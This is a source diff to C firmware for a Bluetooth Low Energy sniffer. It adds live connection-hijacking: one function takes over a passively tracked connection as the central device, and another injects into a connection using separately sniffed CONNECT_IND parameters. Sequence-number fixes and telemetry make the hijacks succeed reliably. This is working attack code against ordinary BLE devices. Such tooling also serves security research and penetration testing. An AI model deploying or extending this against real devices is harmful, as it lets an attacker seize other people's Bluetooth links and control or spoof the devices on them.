@@ -147,6 +147,9 @@ static uint8_t s_scanRspLen;
 static uint8_t s_scanRspData[31];
 
 uint8_t g_pkt_dir = 0;
+static uint8_t hijack_next_tx_sn = 0; // last P->C NESN seen in DATA state
+static uint8_t hijack_report = 0; // emit telemetry for first N central events after a live hijack
+static bool hijack_active = false; // true from a live hijack until the connection ends (end-reason telemetry)
 
 // Maximum time (in microseconds) for DelayHopTrigger to trigger a hop, then
 // for the radio to tune to the next advertising channel, and start listening.
@@ -237,6 +240,8 @@ static void afterConnEvent(bool peripheral, bool gotData)
         connTimeoutTime = curRadioTime + rconf.connTimeoutTicks;
     else if (connTimeoutTime - curRadioTime > 0x80000000)
     {
+        if (hijack_active)
+            dprintf("HJ END: supervision timeout ev=%lu", (unsigned long)connEventCount);
         handleConnFinished();
         return;
     }
@@ -479,6 +484,7 @@ static void radioTaskFunction(UArg arg0, UArg arg1)
             g_pkt_dir = 1;
 
             uint32_t curHopTime = nextHopTime - rconf.hopIntervalTicks + AO_TARG;
+            int32_t hj_margin = (int32_t)(curHopTime - RF_getCurrentTime());
 
             if (rconf.winOffsetCertain)
             {
@@ -509,6 +515,20 @@ static void radioTaskFunction(UArg arg0, UArg arg1)
 
                 if (WinOffset > MaxOffset)
                     dprintf("Central failed to measure WinOffset");
+            }
+
+            // Hijack telemetry: emitted BEFORE the cancellation check so it fires
+            // even when the peripheral terminates mid-event (which sets snifferState
+            // away from CENTRAL and would otherwise skip this via the continue below).
+            // st==0 means the peripheral answered (link is up); margin is how far
+            // ahead of "now" the event anchor was scheduled (radio ticks, 0.25us
+            // each, sane ~= AO_TARG); ch is the data channel, sn the SN we sent.
+            if (hijack_report)
+            {
+                hijack_report--;
+                dprintf("HJ ev=%lu ch=%u margin=%ld st=%d ns=%lu sn=%u",
+                        (unsigned long)connEventCount, chan, (long)hj_margin,
+                        status, (unsigned long)numSent, hijack_next_tx_sn);
             }
 
             if (snifferState != CENTRAL)
@@ -929,6 +949,13 @@ static void reactToDataPDU(const BLE_Frame *frame, bool transmit)
     if (snifferState == DATA)
         g_pkt_dir ^= 1;
 
+    // After the XOR: g_pkt_dir==0 means we just received a P->C packet.
+    // Its NESN (bit 2) is the SN the peripheral expects from the next central
+    // packet. Save it so enterCentralFromData() can start with the correct
+    // nextTxSn instead of always using 0 (which deadlocks in ~50% of hijacks).
+    if (snifferState == DATA && g_pkt_dir == 0 && frame->length >= 2)
+        hijack_next_tx_sn = (frame->pData[0] >> 2) & 1;
+
     // data channel PDUs should at least have a 2 byte header
     if (frame->length < 2)
         return;
@@ -1067,6 +1094,9 @@ static void reactToDataPDU(const BLE_Frame *frame, bool transmit)
         break;
     case 0x02: // LL_TERMINATE_IND
         if (datLen != 2) break;
+        if (hijack_active)
+            dprintf("HJ END: TERMINATE dir=%u err=0x%02x ev=%lu",
+                    g_pkt_dir, frame->pData[3], (unsigned long)connEventCount);
         handleConnFinished();
         break;
     case 0x05: // LL_START_ENC_REQ
@@ -1297,6 +1327,7 @@ static void handleConnReq(PHY_Mode phy, uint32_t connTime, uint8_t *llData,
 
 static void handleConnFinished()
 {
+    hijack_active = false;
     stateTransition(sniffDoneState);
     accessAddress = BLE_ADV_AA;
     AuxAdvScheduler_reset();
@@ -1430,6 +1461,89 @@ void initiateConn(bool isRandom, void *_peerAddr, void *llData)
     memcpy(connReqLLData, llData, 22);
 
     stateTransition(INITIATING);
+    RadioWrapper_stop();
+    TXQueue_init();
+}
+
+/* Mode 0: DATA -> CENTRAL live hijack.
+ * Call only when in DATA state. All connection parameters (accessAddress,
+ * crcInit, rconf, nextHopTime, connEventCount, use_csa2) are already set
+ * from passively following the connection. We just need to reset TX state
+ * and tip the state machine to CENTRAL.
+ */
+void enterCentralFromData(void)
+{
+    /* Force winOffsetCertain so CENTRAL state uses precise TX timing
+     * rather than sweep mode. nextHopTime is accurate from DATA state
+     * tracking even without instahop, so this is safe. */
+    rconf.winOffsetCertain = true;
+    
+    /* When tracking the connection in DATA, nextHopTime aligns with the exact 
+     * start of the reception window. But CENTRAL state assumes it's sending, 
+     * so it waits an extra AO_TARG before listening for the peripheral. 
+     * We must subtract AO_TARG here so our injected CENTRAL packets 
+     * are transmitted perfectly on time instead of arriving late. */
+    nextHopTime -= AO_TARG;
+
+    RadioWrapper_resetSeqStat();
+    RadioWrapper_setNextTxSn(hijack_next_tx_sn);
+    hijack_report = 8; // telemetry: trace the first few central events post-hijack
+    hijack_active = true;
+    stateTransition(CENTRAL);
+    RadioWrapper_stop();
+    TXQueue_init();
+}
+
+/* Mode 1: Enter CENTRAL with explicit connection parameters.
+ * Used when connection parameters are provided from a separately sniffed
+ * CONNECT_IND (e.g. different device or past session).
+ * anchorTicks: radio clock value (RF_getCurrentTime() scale) for the
+ * most recently known anchor point of the connection.
+ */
+void enterCentralDirect(PHY_Mode phy, bool csa2, uint8_t *llData,
+        uint32_t connEvent, uint32_t anchorTicks)
+{
+    /* Extract connection parameters from llData (CONNECT_IND LLData field)
+     * Byte offsets verified against handleConnReq():
+     *   0-3:  Access Address
+     *   4-6:  CRC Init (24-bit)
+     *   8-9:  WinOffset (unused here -- we use anchorTicks directly)
+     *  10-11: Interval (1.25ms units)
+     *  12-13: Latency
+     *  14-15: Timeout (10ms units)
+     *  16-20: Channel Map (5 bytes)
+     *     21: Hop Increment (lower 5 bits) / SCA (upper 3 bits)
+     */
+    accessAddress = *(uint32_t *)llData;
+    hopIncrement = llData[21] & 0x1F;
+    crcInit = (*(uint32_t *)(llData + 4)) & 0xFFFFFF;
+    ll_encryption = false;
+    use_csa2 = csa2;
+    curUnmapped = (uint8_t)(((uint32_t)hopIncrement * (connEvent + 1)) % 37);
+
+    rconf.chanMap = 0;
+    memcpy(&rconf.chanMap, llData + 16, 5);
+    rconf.chanMapCertain = true;
+    computeMaps();
+
+    uint16_t Interval = *(uint16_t *)(llData + 10);
+    rconf.hopIntervalTicks = Interval * 5000;
+    rconf.intervalCertain = true;
+    rconf.winOffsetCertain = true;
+    rconf.phy = phy;
+    rconf.peripheralLatency = *(uint16_t *)(llData + 12);
+    rconf.connTimeoutTicks = *(uint16_t *)(llData + 14) * 40000;
+
+    connEventCount = connEvent;
+    nextHopTime = anchorTicks + rconf.hopIntervalTicks - AO_TARG;
+    connTimeoutTime = RF_getCurrentTime() + rconf.connTimeoutTicks;
+
+    preloadedParamIndex = 0;
+    numParamPairs = 0;
+    rconf_reset();
+
+    RadioWrapper_resetSeqStat();
+    stateTransition(CENTRAL);
     RadioWrapper_stop();
     TXQueue_init();
 }
